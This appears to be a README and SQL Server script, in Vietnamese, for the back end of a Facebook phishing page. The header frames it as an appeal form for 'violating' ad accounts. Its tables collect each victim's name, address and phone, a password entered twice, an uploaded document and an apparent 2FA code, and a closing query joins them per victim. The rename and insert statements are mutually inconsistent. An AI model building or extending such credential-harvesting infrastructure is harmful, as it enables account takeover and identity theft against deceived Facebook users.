# FaceBook
Link Đăng Ký dành from dành cho các tài khoản quảng cáo Facebook đang bị vi phạm và cần gửi tài liệu chứng minh để xét duyệt tài khoản
Datase:   create database facebook
go
-- Bảng lưu thông tin người dùng
CREATE TABLE users
(
    Id INT IDENTITY(1,1) PRIMARY KEY,
    thongtin NVARCHAR(500) NOT NULL,
    name NVARCHAR(100) NOT NULL,
    adress NVARCHAR(200) NOT NULL,
    adressname NVARCHAR(200) NOT NULL,
    phone NVARCHAR(200) NOT NULL,
    facebookpage NVARCHAR(200) NOT NULL
);

-- Bảng lưu thông tin mật khẩu, với quan hệ với bảng users thông qua Iduser
CREATE TABLE matkhau
(
    idmatkhau INT IDENTITY(1,1) PRIMARY KEY,
    matkhau1 NVARCHAR(200),
    matkhau2 NVARCHAR(200),
    Iduser INT,
    FOREIGN KEY (Iduser) REFERENCES users(Id)
);

-- Bảng lưu thông tin về file, với quan hệ với bảng matkhau thông qua idmatkhau
CREATE TABLE files
(
    idfile INT IDENTITY(1,1) PRIMARY KEY,
    file_content VARBINARY(MAX),
    idmatkhau INT,
    FOREIGN KEY (idmatkhau) REFERENCES matkhau(idmatkhau)
);

sp_rename 'files.FileContent', 'file_content', 'COLUMN';



-- Bảng lưu thông tin về code, với quan hệ với bảng files thông qua idfile
CREATE TABLE code
(
    idcode INT IDENTITY(1,1) PRIMARY KEY,
    macode INT,
    idfile INT,
    FOREIGN KEY (idfile) REFERENCES files(idfile)
);

-- Thêm dữ liệu cho bảng 'users'
INSERT INTO users (thongtin, name, adress, adressname, phone, facebookpage)
VALUES
    ('Thông tin 1', 'Người dùng 1', 'Địa chỉ 1', 'Tên địa chỉ 1', '123456789', 'Facebook 1'),
    ('Thông tin 2', 'Người dùng 2', 'Địa chỉ 2', 'Tên địa chỉ 2', '987654321', 'Facebook 2');

-- Thêm dữ liệu cho bảng 'matkhau'
INSERT INTO matkhau (matkhau1, matkhau2, Iduser)
VALUES
    ('Mật khẩu 1', 'Mật khẩu 1', 1),
    ('Mật khẩu 2', 'Mật khẩu 2', 2);

-- Thêm dữ liệu cho bảng 'files'
INSERT INTO files (FileContent, idmatkhau)
VALUES
    (0x5468697320697320612046696c65436f6e74656e7421, 1),
    (0x5468697320697320612046696c65436f6e74656e7422, 2);

-- Thêm dữ liệu cho bảng 'code'
INSERT INTO code (macode, idfile)
VALUES
    (123456, 1),
    (789012, 2);

-- Lưu ý: Giá trị 0x255044462D312E360D25E2E3CFD30D0A là một ví dụ về dữ liệu VARBINARY (PDF) mẫu.
select * from users
select * from files
select * from matkhau
select * from code


SELECT
    u.name AS name,
    u.phone AS sdt,
    m.matkhau1 AS matkhau,
    f.file_content AS filecontent,
    c.macode AS macode
FROM users u
INNER JOIN matkhau m ON u.Id = m.Iduser
INNER JOIN files f ON m.idmatkhau = f.idmatkhau
INNER JOIN code c ON f.idfile = c.idfile;
